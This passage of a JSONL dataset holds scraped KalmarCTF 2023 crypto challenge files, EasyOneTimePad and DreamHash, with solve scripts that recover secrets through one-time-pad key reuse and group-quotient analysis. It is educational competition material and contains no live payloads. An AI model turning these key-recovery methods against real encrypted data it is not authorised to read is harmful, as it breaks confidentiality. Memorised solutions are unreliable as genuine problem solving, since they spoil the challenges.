"2025-10-26T18:19:59.205387"}
{"id": "kalmar_kalmarctf_Writeup_Solve_script_for_\"EasyOneTimePad\"_for_KalmarCTF_2023", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "Writeup/Solve script for \"EasyOneTimePad\" for KalmarCTF 2023", "attack_type": "XOR", "writeup": "#!/usr/bin/env python3\n\n# Writeup/Solve script for \"EasyOneTimePad\" for KalmarCTF 2023\n# by shalaamum\n\n# This was intended as an easy crypto challenge, with the basic idea being that\n# \"one-time pads\" are insecure when reusing the key, but after knowing that one\n# still has to figure out how to actually extract the secret.\n\nimport itertools\nimport functools\nimport sage.all\nimport pwnlib.tubes.process\nimport pwnlib.tubes.remote\nfrom challenge import PASS_LENGTH_BYTES\n\n# The following writeup assumes that PASS_LENGTH_BYTES=32 for illustration, for\n# the actual challenge PASS_LENGTH_BYTES was chosen to be larger, but this does\n# not matter for how the solution works.\n# While the password and the key have the same length, the password is\n# converted to a hex string before xoring, which doubles its length. Therefore\n# the same byte of the key is used twice to encrypt a byte of that hexstring,\n# making this not a secure usage of one-time pads, for if r is a random byte\n# and we know x ^ r as well as y ^ r, we can recover x ^ y = (x^r) ^ (y^r), so\n# the first encryption already allows us to recover the second half of the\n# password if we know the first half.\n# We can think of this systematically in the following way.\n# Let x=(x0, ..., x31) be the least significant halves of the password bytes.\n# Then the first encryption allows us, by taking the xors as described above,\n# to evaluate Ax, where A is the following matrix (over the ring F2[x]/x^8, in\n# which addition corresponds to xor):\n# (1 0 ... 0 1 0 ... 0)\n# (0 1 ... 0 0 1 ... 0)\n# (          .        )\n# (          .        )\n# (          .        )\n# (0 0 ... 1 0 0 ... 1)\n# This matrix can be described as the block matrix (id id), with id the\n# identity 16x16 matrix.  This is a 16x32 matrix. The second encryption, which\n# depends on our permutation, will allow us to add another 16 rows. We will\n# then get a 32x32 matrix, and if that matrix were invertible, we would be able\n# to recover the least significant four bits of each byte of the password.\n# However, it will not be possible to make this matrix invertible: Every row\n# contains zeroes and exactly two ones, and linear combinations in\n# characteristic 2 of such rows will always have an even number of non-zero\n# entries. But it is possible to obtain rank 31, with the additional rows as\n# follows:\n#  0 1 2 3        16\n# (1 1 0 0 ... 0 0 0 0 0 0 0 ... 0 0 0)\n# (0 0 1 1 ... 0 0 0 0 0 0 0 ... 0 0 0)\n# (         .                         )\n# (         .                         )\n# (0 0 0 0 ... 1 1 0 0 0 0 0 ... 0 0 0)\n# (0 0 0 0 ... 0 0 0 1 1 0 0 ... 0 0 0)\n# (0 0 0 0 ... 0 0 0 0 0 1 1 ... 0 0 0)\n# (                           .       )\n# (                           .       )\n# (0 0 0 0 ... 0 0 0 0 0 0 0 ... 1 1 0)\n# (0 0 0 0 ... 0 0 1 0 0 0 0 ... 0 0 1)\n# This corresponds to the permutation\n# 0,2,...,14,17,...,29,16,1,3,...,15,18,...,30,31\n# Choosing this permutation the upshot is that fixing e.g. x31 we will be able\n# to determine all the other x0,...,x30 from x31. But note that all of these\n# must be an ASCII character from '0' through '9' or 'a' through 'f'. So we can\n# go through all 16 possibilities for x31 and check if the corresponding values\n# of x0, ..., x30 all lie in that that set, and throw away values for x31 in\n# which that is not the case. In the end, we guess one of the remaining\n# possible values of x31 - hopefully there will actually be only one remaining.\n\nF = sage.all.GF(2)\nP = sage.all.PolynomialRing(F, ['x'])\n\n# Simple function to convert integers to polynomials.\n# The bits of the integer correspond to the coefficients of the polynomial,\n# with the least significant bit corresponding to x^0\n@functools.cache\ndef int_to_polynomial(value):\n    x = P.gens()[0]\n    value = int(value)\n    assert value >= 0\n    result = P(0)\n    i = 1\n    e = 0\n    while i <= value:\n        if i & value:\n            result += x**e\n        i = i << 1\n        e += 1\n    return result\n\n# Convert a polynomial to the corresponding integer\n@functools.cache\ndef polynomial_to_int(poly):\n    return int(poly.change_ring(sage.all.ZZ)(2))\n\ndef solve_half(enc_id, enc_perm):\n    # Solution for the part with only least or most significant 4 bits\n    assert len(enc_id) == PASS_LENGTH_BYTES\n    assert len(enc_perm) == PASS_LENGTH_BYTES\n    # the return value of bytes.hex will only use these characters\n    ALLOWED_CHARACTERS = '0123456789abcdef'\n\n    print('Xoring to get relations...')\n    # so here we carry out the xors for the two values that were xored with\n    # the same random byte, so that we get (x ^ r) ^ (y ^ r) = x ^ y\n    target = [enc_id[i] ^ enc_id[i + (PASS_LENGTH_BYTES // 2)]\n                     for i in range(0, PASS_LENGTH_BYTES // 2)]\n    target += [enc_perm[i] ^ enc_perm[i + (PASS_LENGTH_BYTES // 2)]\n                     for i in range(0, PASS_LENGTH_BYTES // 2)]\n    print('Constructing target vector without guess in polynomial ring...')\n    target = [int_to_polynomial(x) for x in target]\n    print('Constructing m", "solution_code": "    print('Xoring to get relations...')\n    # so here we carry out the xors for the two values that were xored with\n    # the same random byte, so that we get (x ^ r) ^ (y ^ r) = x ^ y\n    target = [enc_id[i] ^ enc_id[i + (PASS_LENGTH_BYTES // 2)]\n                     for i in range(0, PASS_LENGTH_BYTES // 2)]\n    target += [enc_perm[i] ^ enc_perm[i + (PASS_LENGTH_BYTES // 2)]\n                     for i in range(0, PASS_LENGTH_BYTES // 2)]\n    print('Constructing target vector without guess in polynomial ring...')\n    target = [int_to_polynomial(x) for x in target]\n    print('Constructing matrix')\n    # This is the matrix that was discussed above...\n    matrix_rows = []\n    for i in range(PASS_LENGTH_BYTES // 2):\n        matrix_rows.append(([0]*i + [1] + [0]*((PASS_LENGTH_BYTES // 2) - i - 1)) * 2)\n    for i in itertools.chain(\n            range(0, (PASS_LENGTH_BYTES // 2) - 1, 2),\n            range((PASS_LENGTH_BYTES // 2) + 1, PASS_LENGTH_BYTES - 2, 2)):\n        matrix_rows.append([0]*i + [1,1] + [0]*(PASS_LENGTH_BYTES - i - 2))\n    matrix_rows.append(\n            [0]*(PASS_LENGTH_BYTES // 2) + [1] + [0]*((PASS_LENGTH_BYTES // 2) - 2) + [1])\n    # ...but we add an extra row so that the last component of Ax will be x31.\n    # We do this so that we can obtain a unique preimage x for each guess of x31.\n    matrix_rows.append([0]*(PASS_LENGTH_BYTES - 1) + [1])\n    M = sage.all.matrix(P, matrix_rows)\n    #print('Checking matrix rank...')\n    #assert int(M.rank()) == PASS_LENGTH_BYTES\n    possible_password = []\n    for guess in ALLOWED_CHARACTERS:\n        print(f'Guessing \"{guess}\" for the last byte')\n        guess = int_to_polynomial(ord(guess))\n        target_vector = sage.all.vector(target + [guess])\n        password = []\n        for x in M.solve_right(target_vector):\n            # The solve_right does not return components in the polynomial\n            # ring itself, but in the fraction field, so we check that the\n            # result actually lies in the polynomial ring.\n            assert x.is_integral()\n            password.append(polynomial_to_int(x.numerator()))\n        password = bytes(password)\n        if all(chr(x) in ALLOWED_CHARACTERS for x in password):\n            print(f'Found possible solution: {password.decode()}')\n            # It is unlikely that we will find more than one possibility.\n            possible_password.append(password)\n    return possible_password\n", "tools": ["sage"], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\EasyOneTimePad\\solution\\solve.py", "file_size": 8399, "scraped_at": "2025-10-26T18:19:59.221934"}
{"id": "kalmar_kalmarctf_challenge", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "challenge", "attack_type": "Unknown", "writeup": "#!/usr/bin/env python3\n\nimport os\n\nPASS_LENGTH_BYTES = 128\n\ndef encrypt_otp(cleartext):\n    key = os.urandom(len(cleartext))\n    ciphertext = bytes([key[i % len(key)] ^ x for i,x in enumerate(cleartext.hex().encode())])\n    return ciphertext, key\n\n\nif __name__ == '__main__':\n    print('According to Wikipedia:')\n    print('\"In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but requires the use of a single-use pre-shared key that is not smaller than the message being sent.\"')\n    print('So have fun trying to figure out my password!')\n    password = os.urandom(PASS_LENGTH_BYTES)\n\n    enc, _ = encrypt_otp(password)\n    print(f'Here is my password encrypted with a one-time pad: {enc.hex()}')\n    print('Actually, I will give you my password encrypted another time.')\n    print('This time you are allowed to permute the password first')\n    permutation = input('Permutation: ')\n    try:\n        permutation = [int(x) for x in permutation.strip().split(',')]\n        assert len(permutation) == PASS_LENGTH_BYTES\n        assert set(permutation) == set(range(PASS_LENGTH_BYTES))\n        enc, _ = encrypt_otp(bytes([password[permutation[i]] for i in range(PASS_LENGTH_BYTES)]))\n        print(f'Here is the permuted password encrypted with another one-time pad: {enc.hex()}')\n    except:\n        print('Something went wrong!')\n        exit(1)\n    password_guess = input('What is my password: ')\n    try:\n        password_guess = bytes.fromhex(password_guess)\n    except:\n        print('Something went wrong!')\n        exit(1)\n    if password_guess == password:\n        with open('flag.txt', 'r') as f:\n            flag = f.read()\n            print(f'The flag is {flag}')\n    else:\n        print('Nope.')\n", "solution_code": "    print('According to Wikipedia:')\n    print('\"In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but requires the use of a single-use pre-shared key that is not smaller than the message being sent.\"')\n    print('So have fun trying to figure out my password!')\n    password = os.urandom(PASS_LENGTH_BYTES)\n\n\n    enc, _ = encrypt_otp(password)\n    print(f'Here is my password encrypted with a one-time pad: {enc.hex()}')\n    print('Actually, I will give you my password encrypted another time.')\n    print('This time you are allowed to permute the password first')\n    permutation = input('Permutation: ')\n    try:\n        permutation = [int(x) for x in permutation.strip().split(',')]\n        assert len(permutation) == PASS_LENGTH_BYTES\n        assert set(permutation) == set(range(PASS_LENGTH_BYTES))\n        enc, _ = encrypt_otp(bytes([password[permutation[i]] for i in range(PASS_LENGTH_BYTES)]))\n        print(f'Here is the permuted password encrypted with another one-time pad: {enc.hex()}')\n    except:\n        print('Something went wrong!')\n        exit(1)\n    password_guess = input('What is my password: ')\n    try:\n        password_guess = bytes.fromhex(password_guess)\n    except:\n        print('Something went wrong!')\n        exit(1)\n    if password_guess == password:\n        with open('flag.txt', 'r') as f:\n            flag = f.read()\n            print(f'The flag is {flag}')\n    else:\n        print('Nope.')\n", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\EasyOneTimePad\\internal_hosting\\src\\challenge.py", "file_size": 1743, "scraped_at": "2025-10-26T18:19:59.223699"}
{"id": "kalmar_kalmarctf_I_read_that_it_is_important_to_use_nothing-up-my-sleeves-numbers_for", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "I read that it is important to use nothing-up-my-sleeves-numbers for", "attack_type": "Misc", "writeup": "#!/usr/bin/env python3\n\nimport random\nimport base64\n\nVALUESIZE = 216\nBLOCKSIZE = 16\n\nclass Value:\n    def __init__(self, n):\n        if isinstance(n, Value):\n            n = n.n\n        if not (isinstance(n, int) and 0 <= n <= VALUESIZE):\n            raise ValueError\n        self.n = n\n\n    def __eq__(self, other):\n        return self.n == other.n\n\n    def extract(self):\n        a = self.n % 3\n        b = ((self.n // 27) + 1) % 3\n        c = (self.n // 9) % 3\n        d = (((self.n // 27) + 1) // 3) % 3\n        if b == 0:\n            f = (self.n // 3) % 3\n            e = (2 * d) % 3\n        else:\n            e = (self.n // 3) % 3\n            f = ((1 + d*e) * b) % 3\n        return a,b,c,d,e,f\n\n    @classmethod\n    def assemble(cls, a, b, c, d, e, f):\n        for x in (a,b,c,d,e,f):\n            if not (isinstance(x, int) and 0 <= x <= 2):\n                raise ValueError\n        n = 0\n        n += a\n        n += 27 * ((b + 3 * d) - 1)\n        n += 9 * c\n        if b == 0:\n            n += 3 * f\n        else:\n            n += 3 * e\n        return Value(n)\n\n    def __add__(self, other):\n        sa, sb, sc, sd, se, sf = self.extract()\n        oa, ob, oc, od, oe, of = other.extract()\n        a = (sa + sb * oa + sd * oc) % 3\n        b = (sb * ob + sd * oe) % 3\n        c = (sc + se * oa + sf * oc) % 3\n        d = (sb * od + sd * of) % 3\n        e = (se * ob + sf * oe) % 3\n        f = (se * od + sf * of) % 3\n        return Value.assemble(a, b, c, d, e, f)\n\n    def __str__(self):\n        return str(self.n)\n\n    def __repr__(self):\n        return repr(self.n)\n\nclass DreamHash:\n    def __init__(self):\n        # I read that it is important to use nothing-up-my-sleeves-numbers for\n        # constants in cryptosystems, so I generate the template randomly.\n        self.template = [\n                random.sample(\n                    sum([[(i+j) % BLOCKSIZE]*(1 if j == 0 else j*VALUESIZE)\n                         for j in range(BLOCKSIZE)], []),\n                    k=(1 + VALUESIZE * sum(range(BLOCKSIZE)))\n                    )\n                for i in range(BLOCKSIZE)\n                ]\n\n    def hash(self, data):\n        unfolded_data = [Value(d) for d in data]\n        unfolded_data += [Value(0)] * (BLOCKSIZE - (len(unfolded_data) % BLOCKSIZE))\n        folded_data = [sum(unfolded_data[i::BLOCKSIZE], Value(0)) for i in range(BLOCKSIZE)]\n        result = []\n        for i in range(BLOCKSIZE):\n            result.append(Value(0))\n            for j in self.template[i]:\n                result[-1] += folded_data[j]\n        return [x.n for x in result]\n\ndef main():\n    print('Welcome to the DreamHash testing service.')\n    H = DreamHash()\n    secret = bytes([random.randrange(VALUESIZE) for _ in range(BLOCKSIZE)])\n    print('I generated a secret. Can you recover it?')\n    for _ in range(4):\n        try:\n            user_bytes = base64.b64decode(input('Your values: '))\n            h = H.hash(secret + user_bytes)\n            print(f'Hash: {base64.b64encode(bytes(h)).decode()}')\n        except:\n            exit(0)\n    user_bytes = base64.b64decode(input('Your guess at secret: '))\n    if user_bytes == secret:\n        with open('flag.txt', 'r') as f:\n            print(f.read())\n    else:\n        print('Wrong.\\n')\n\n\nif __name__ == '__main__':\n    main()\n", "solution_code": "    def __init__(self, n):\n        if isinstance(n, Value):\n            n = n.n\n        if not (isinstance(n, int) and 0 <= n <= VALUESIZE):\n            raise ValueError\n        self.n = n\n\n\n    def __eq__(self, other):\n        return self.n == other.n\n\n\n    def extract(self):\n        a = self.n % 3\n        b = ((self.n // 27) + 1) % 3\n        c = (self.n // 9) % 3\n        d = (((self.n // 27) + 1) // 3) % 3\n        if b == 0:\n            f = (self.n // 3) % 3\n            e = (2 * d) % 3\n        else:\n            e = (self.n // 3) % 3\n            f = ((1 + d*e) * b) % 3\n        return a,b,c,d,e,f\n\n\n    @classmethod\n    def assemble(cls, a, b, c, d, e, f):\n        for x in (a,b,c,d,e,f):\n            if not (isinstance(x, int) and 0 <= x <= 2):\n                raise ValueError\n        n = 0\n        n += a\n        n += 27 * ((b + 3 * d) - 1)\n        n += 9 * c\n        if b == 0:\n            n += 3 * f\n        else:\n            n += 3 * e\n        return Value(n)\n\n\n    def __add__(self, other):\n        sa, sb, sc, sd, se, sf = self.extract()\n        oa, ob, oc, od, oe, of = other.extract()\n        a = (sa + sb * oa + sd * oc) % 3\n        b = (sb * ob + sd * oe) % 3\n        c = (sc + se * oa + sf * oc) % 3\n        d = (sb * od + sd * of) % 3\n        e = (se * ob + sf * oe) % 3\n        f = (se * od + sf * of) % 3\n        return Value.assemble(a, b, c, d, e, f)\n\n\n    def __str__(self):\n        return str(self.n)\n\n\n    def __repr__(self):\n        return repr(self.n)\n\n\n    def __init__(self):\n        # I read that it is important to use nothing-up-my-sleeves-numbers for\n        # constants in cryptosystems, so I generate the template randomly.\n        self.template = [\n                random.sample(\n                    sum([[(i+j) % BLOCKSIZE]*(1 if j == 0 else j*VALUESIZE)\n                         for j in range(BLOCKSIZE)], []),\n                    k=(1 + VALUESIZE * sum(range(BLOCKSIZE)))\n                    )\n                for i in range(BLOCKSIZE)\n                ]\n\n\n    def hash(self, data):\n        unfolded_data = [Value(d) for d in data]\n        unfolded_data += [Value(0)] * (BLOCKSIZE - (len(unfolded_data) % BLOCKSIZE))\n        folded_data = [sum(unfolded_data[i::BLOCKSIZE], Value(0)) for i in range(BLOCKSIZE)]\n        result = []\n        for i in range(BLOCKSIZE):\n            result.append(Value(0))\n            for j in self.template[i]:\n                result[-1] += folded_data[j]\n        return [x.n for x in result]\n\n\n    print('Welcome to the DreamHash testing service.')\n    H = DreamHash()\n    secret = bytes([random.randrange(VALUESIZE) for _ in range(BLOCKSIZE)])\n    print('I generated a secret. Can you recover it?')\n    for _ in range(4):\n        try:\n            user_bytes = base64.b64decode(input('Your values: '))\n            h = H.hash(secret + user_bytes)\n            print(f'Hash: {base64.b64encode(bytes(h)).decode()}')\n        except:\n            exit(0)\n    user_bytes = base64.b64decode(input('Your guess at secret: '))\n    if user_bytes == secret:\n        with open('flag.txt', 'r') as f:\n            print(f.read())\n    else:\n        print('Wrong.\\n')\n", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\DreamHash\\public\\challenge_file.py", "file_size": 3279, "scraped_at": "2025-10-26T18:19:59.238258"}
{"id": "kalmar_kalmarctf_\"DreamHash\"_challenge_for_KalmarCTF_2023", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "\"DreamHash\" challenge for KalmarCTF 2023", "attack_type": "Misc", "writeup": "#!/usr/bin/env python3\n\n# \"DreamHash\" challenge for KalmarCTF 2023\n# by shalaamum\n\nimport random\nimport base64\n\nVALUESIZE = 216\nBLOCKSIZE = 16\n\nclass Value:\n    def __init__(self, n):\n        if isinstance(n, Value):\n            n = n.n\n        if not (isinstance(n, int) and 0 <= n <= VALUESIZE):\n            raise ValueError\n        self.n = n\n\n    def __eq__(self, other):\n        return self.n == other.n\n\n    def extract(self):\n        a = self.n % 3\n        b = ((self.n // 27) + 1) % 3\n        c = (self.n // 9) % 3\n        d = (((self.n // 27) + 1) // 3) % 3\n        if b == 0:\n            f = (self.n // 3) % 3\n            e = (2 * d) % 3\n        else:\n            e = (self.n // 3) % 3\n            f = ((1 + d*e) * b) % 3\n        return a,b,c,d,e,f\n\n    @classmethod\n    def assemble(cls, a, b, c, d, e, f):\n        for x in (a,b,c,d,e,f):\n            if not (isinstance(x, int) and 0 <= x <= 2):\n                raise ValueError\n        n = 0\n        n += a\n        n += 27 * ((b + 3 * d) - 1)\n        n += 9 * c\n        if b == 0:\n            n += 3 * f\n        else:\n            n += 3 * e\n        return Value(n)\n\n    def __add__(self, other):\n        sa, sb, sc, sd, se, sf = self.extract()\n        oa, ob, oc, od, oe, of = other.extract()\n        a = (sa + sb * oa + sd * oc) % 3\n        b = (sb * ob + sd * oe) % 3\n        c = (sc + se * oa + sf * oc) % 3\n        d = (sb * od + sd * of) % 3\n        e = (se * ob + sf * oe) % 3\n        f = (se * od + sf * of) % 3\n        return Value.assemble(a, b, c, d, e, f)\n\n    def __str__(self):\n        return str(self.n)\n\n    def __repr__(self):\n        return repr(self.n)\n\nclass DreamHash:\n    def __init__(self):\n        # I read that it is important to use nothing-up-my-sleeves-numbers for\n        # constants in cryptosystems, so I generate the template randomly.\n        self.template = [\n                random.sample(\n                    sum([[(i+j) % BLOCKSIZE]*(1 if j == 0 else j*VALUESIZE)\n                         for j in range(BLOCKSIZE)], []),\n                    k=(1 + VALUESIZE * sum(range(BLOCKSIZE)))\n                    )\n                for i in range(BLOCKSIZE)\n                ]\n\n    def hash(self, data):\n        unfolded_data = [Value(d) for d in data]\n        unfolded_data += [Value(0)] * (BLOCKSIZE - (len(unfolded_data) % BLOCKSIZE))\n        folded_data = [sum(unfolded_data[i::BLOCKSIZE], Value(0)) for i in range(BLOCKSIZE)]\n        result = []\n        for i in range(BLOCKSIZE):\n            result.append(Value(0))\n            for j in self.template[i]:\n                result[-1] += folded_data[j]\n        return [x.n for x in result]\n\ndef main():\n    print('Welcome to the DreamHash testing service.')\n    H = DreamHash()\n    secret = bytes([random.randrange(VALUESIZE) for _ in range(BLOCKSIZE)])\n    print('I generated a secret. Can you recover it?')\n    for _ in range(4):\n        try:\n            user_bytes = base64.b64decode(input('Your values: '))\n            h = H.hash(secret + user_bytes)\n            print(f'Hash: {base64.b64encode(bytes(h)).decode()}')\n        except:\n            exit(0)\n    user_bytes = base64.b64decode(input('Your guess at secret: '))\n    if user_bytes == secret:\n        with open('flag.txt', 'r') as f:\n            print(f.read())\n    else:\n        print('Wrong.\\n')\n\n\nif __name__ == '__main__':\n    main()\n", "solution_code": "    def __init__(self, n):\n        if isinstance(n, Value):\n            n = n.n\n        if not (isinstance(n, int) and 0 <= n <= VALUESIZE):\n            raise ValueError\n        self.n = n\n\n\n    def __eq__(self, other):\n        return self.n == other.n\n\n\n    def extract(self):\n        a = self.n % 3\n        b = ((self.n // 27) + 1) % 3\n        c = (self.n // 9) % 3\n        d = (((self.n // 27) + 1) // 3) % 3\n        if b == 0:\n            f = (self.n // 3) % 3\n            e = (2 * d) % 3\n        else:\n            e = (self.n // 3) % 3\n            f = ((1 + d*e) * b) % 3\n        return a,b,c,d,e,f\n\n\n    @classmethod\n    def assemble(cls, a, b, c, d, e, f):\n        for x in (a,b,c,d,e,f):\n            if not (isinstance(x, int) and 0 <= x <= 2):\n                raise ValueError\n        n = 0\n        n += a\n        n += 27 * ((b + 3 * d) - 1)\n        n += 9 * c\n        if b == 0:\n            n += 3 * f\n        else:\n            n += 3 * e\n        return Value(n)\n\n\n    def __add__(self, other):\n        sa, sb, sc, sd, se, sf = self.extract()\n        oa, ob, oc, od, oe, of = other.extract()\n        a = (sa + sb * oa + sd * oc) % 3\n        b = (sb * ob + sd * oe) % 3\n        c = (sc + se * oa + sf * oc) % 3\n        d = (sb * od + sd * of) % 3\n        e = (se * ob + sf * oe) % 3\n        f = (se * od + sf * of) % 3\n        return Value.assemble(a, b, c, d, e, f)\n\n\n    def __str__(self):\n        return str(self.n)\n\n\n    def __repr__(self):\n        return repr(self.n)\n\n\n    def __init__(self):\n        # I read that it is important to use nothing-up-my-sleeves-numbers for\n        # constants in cryptosystems, so I generate the template randomly.\n        self.template = [\n                random.sample(\n                    sum([[(i+j) % BLOCKSIZE]*(1 if j == 0 else j*VALUESIZE)\n                         for j in range(BLOCKSIZE)], []),\n                    k=(1 + VALUESIZE * sum(range(BLOCKSIZE)))\n                    )\n                for i in range(BLOCKSIZE)\n                ]\n\n\n    def hash(self, data):\n        unfolded_data = [Value(d) for d in data]\n        unfolded_data += [Value(0)] * (BLOCKSIZE - (len(unfolded_data) % BLOCKSIZE))\n        folded_data = [sum(unfolded_data[i::BLOCKSIZE], Value(0)) for i in range(BLOCKSIZE)]\n        result = []\n        for i in range(BLOCKSIZE):\n            result.append(Value(0))\n            for j in self.template[i]:\n                result[-1] += folded_data[j]\n        return [x.n for x in result]\n\n\n    print('Welcome to the DreamHash testing service.')\n    H = DreamHash()\n    secret = bytes([random.randrange(VALUESIZE) for _ in range(BLOCKSIZE)])\n    print('I generated a secret. Can you recover it?')\n    for _ in range(4):\n        try:\n            user_bytes = base64.b64decode(input('Your values: '))\n            h = H.hash(secret + user_bytes)\n            print(f'Hash: {base64.b64encode(bytes(h)).decode()}')\n        except:\n            exit(0)\n    user_bytes = base64.b64decode(input('Your guess at secret: '))\n    if user_bytes == secret:\n        with open('flag.txt', 'r') as f:\n            print(f.read())\n    else:\n        print('Wrong.\\n')\n", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\DreamHash\\solution\\challenge.py", "file_size": 3338, "scraped_at": "2025-10-26T18:19:59.255281"}
{"id": "kalmar_kalmarctf_Writeup_Solve_script_for_\"DreamHash\"_challenge_at_KalmarCTF_2023", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "Writeup/Solve script for \"DreamHash\" challenge at KalmarCTF 2023", "attack_type": "Misc", "writeup": "#!/usr/bin/env python3\n\n# Writeup/Solve script for \"DreamHash\" challenge at KalmarCTF 2023\n# by shalaamum\n\n# Suppose you have a complicated object and a difficult problem to solve on\n# that object. One general strategy is to try to decompose that complicated\n# object into easier pieces for which the problem can be solved, and then glue\n# these solutions together to a solution for the complicated object. One\n# instance of this that often appears in crypto challenges is that we want to\n# find an element of Z/nZ satisfying some properties, but this is very hard.\n# But we can write n as a product, and solving the corresponding problem modulo\n# these factors is easier (for example it could be that the problem is easy\n# modulo primes, but hard modulo composites). At the end we then use the\n# Chinese remainder theorem to glue the solutions together to find that element\n# of Z/nZ that we wanted.\n#\n# In this challenge, the object for which we have a problem is a group. It\n# turns out that the problem is very easy to solve for commutative groups, but\n# the one we have to deal with is unfortunately not commutative. So we want to\n# decompose the group in some way into commutative pieces for which we can\n# solve the problem. One easy way to decompose a group, and the most analogous\n# to the previous example, would be as a direct product. However a more general\n# way is in terms of group extensions\n# (see https://en.wikipedia.org/wiki/Group_extension),\n# and this is what is required for the solution of this challenge.\n# Integers get used a lot in cryptography and most who tried this challenge\n# likely know that integers that are the product of small primes are weak for\n# many applications in cryptography. The hope was that this challenge might\n# introduce one way that some might not have known before in which finite\n# groups can also be weak, and make people ask the question \"is there a way to\n# decompose this object I have not thought of yet?\" in more contexts.\n\n\nimport functools\nimport itertools\nimport base64\nimport pwnlib.tubes.process\nimport pwnlib.tubes.remote\nfrom challenge import * # Assumes the challenge file is named \"challenge.py\" and in the same dir,\n                        # if this is not the case you need to change this line\n\n# First we try to understand the values better.\n# We evidently have a set with 216 elements and a binary operation.\n# Value(0) is used as padding etc., so is this a neutral element?\nzero_neutral = True\nfor i in range(VALUESIZE):\n    if Value(0) + Value(i) != Value(i) or Value(i) + Value(0) != Value(i):\n        zero_neutral = False\n        break\nprint(f'Value(0) is neutral element: {zero_neutral}')\n\n# Now let us check associativity\nassociative = True\n# Commented after running it once because it takes a bit, the outcome is that\n# the binary operation *is* associative\n\n#n = 0\n#for i,j,k in itertools.product(range(VALUESIZE), repeat=3):\n#    if (Value(i) + Value(j)) + Value(k) != Value(i) + (Value(j) + Value(k)):\n#        associative = False\n#        break\n#    n += 1\n#    if n % 1000 == 0:\n#        print(f'\\rChecking associativity: {100*(n / (VALUESIZE**3)):.2f}%', end=' '*10)\n\nprint(f'\\rAssociativity holds: {associative}' + ' '*30)\n\n# Now let us check commutativity\ncommutative = True\nfor i,j in itertools.product(range(VALUESIZE), repeat=2):\n    if Value(i) + Value(j) != Value(j) + Value(i):\n        commutative = False\n        break\nprint(f'Commutativity holds: {commutative}')\n\n# Finally, are there inverses?\ninverses = True\nfor i in range(VALUESIZE):\n    inverse_for_i = False\n    for j in range(VALUESIZE):\n        if Value(i) + Value(j) == Value(0):\n            inverse_for_i = True\n            break\n    if not inverse_for_i:\n        inverses = False\n        break\nprint(f'Inverses exist: {inverses}')\n\n# The outcome should be that Value(0) is a neutral element, associativity\n# holds, and inverses exist.\n# This means that this is a group G, but unfortunately not commutative.  In the\n# following, \"multiply\" will be used for the group operation, even though\n# __add__ is used in the implementation, fitting better with the group not\n# being commutative.\n# Why would it be helpful if G were commutative? Component i of the hash is\n# obtained by multiplying together components of the input after folding the\n# data into one block. In that product, component i of the input occurs\n# exactly once, whereas components other than i occur a multiple of 216 times\n# (see the template definition). As g^{|G|} is the neutral element for any\n# element g of G, the hash function would thus be the easy to understand\n# folding step composed with the identity -- if only G were commutative!\n# The next best thing we can do is try to pass to a commutative quotient.\n# If N <| G is a normal subgroupp of G, then the hash function on a single\n# block, which is a map of sets\n# G x ... x G  -->  G x ... x G\n# induces a well-defined map of sets\n# G/N x ... x G/N  -->  G/N x ... x G/N\n# which by the previous argument would be th", "solution_code": "    print(f'|G^({len(derived_series)-1})| = {len(derived_series[-1])}')\n    derived_series.append(commutator_subgroup(derived_series[-1]))\n\n\n    r.recvuntil(b'Your values: ')\n    r.send(base64.b64encode(bytes(inverse_secret)) + b'\\n')\n    r.recvuntil(b'Hash: ')\n    data = r.recvuntil(b'\\n').decode().strip()\n    h = base64.b64decode(data)\n    print(f'hash: {list(h)}')\n    # h is the hash of the componentwise addition of secret and inverse_secret.\n    # We have arranged it so that that product is in G^(n).  Thus the residue\n    # classes mod G^(n+1) of the components of the hash correspond to those of\n    # secret + inverse_secret\n    #\n    # So in G^(n) / G^(n+1) we will have that\n    # Value(h[i]) == Value(secret[i]) + Value(inverse_secret[i])\n    # which means that we can get\n    # -Value(secret[i]) = Value(inverse_secret[i]) - Value(h[i])\n    # still only valid modulo G^(n+1).\n    # So we update inverse_secret using this formula, and if before the update\n    # inverse_secret was correctly the inverse of secret modulo G^(n), then the\n    # new value will be correct modulo G^(n+1).\n    inverse_secret_new = []\n    secret = []\n    for i in range(BLOCKSIZE):\n        inverse_secret_new.append(\n                (Value(inverse_secret[i]) + Value(invert(h[i]))).n )\n        secret.append(invert(inverse_secret_new[-1]))\n    inverse_secret = inverse_secret_new\n    print(f'Current value of secret: {secret}')\n", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\DreamHash\\solution\\solve.py", "file_size": 11246, "scraped_at": "2025-10-26T18:19:59.270751"}
{"id": "kalmar_kalmarctf_I_read_that_it_is_important_to_use_nothing-up-my-sleeves-numbers_for", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "I read that it is important to use nothing-up-my-sleeves-numbers for", "attack_type": "Misc", "writeup": "#!/usr/bin/env python3\n\nimport random\nimport base64\n\nVALUESIZE = 216\nBLOCKSIZE = 16\n\nclass Value:\n    def __init__(self, n):\n        if isinstance(n, Value):\n            n = n.n\n        if not (isinstance(n, int) and 0 <= n <= VALUESIZE):\n            raise ValueError\n        self.n = n\n\n    def __eq__(self, other):\n        return self.n == other.n\n\n    def extract(self):\n        a = self.n % 3\n        b = ((self.n // 27) + 1) % 3\n        c = (self.n // 9) % 3\n        d = (((self.n // 27) + 1) // 3) % 3\n        if b == 0:\n            f = (self.n // 3) % 3\n            e = (2 * d) % 3\n        else:\n            e = (self.n // 3) % 3\n            f = ((1 + d*e) * b) % 3\n        return a,b,c,d,e,f\n\n    @classmethod\n    def assemble(cls, a, b, c, d, e, f):\n        for x in (a,b,c,d,e,f):\n            if not (isinstance(x, int) and 0 <= x <= 2):\n                raise ValueError\n        n = 0\n        n += a\n        n += 27 * ((b + 3 * d) - 1)\n        n += 9 * c\n        if b == 0:\n            n += 3 * f\n        else:\n            n += 3 * e\n        return Value(n)\n\n    def __add__(self, other):\n        sa, sb, sc, sd, se, sf = self.extract()\n        oa, 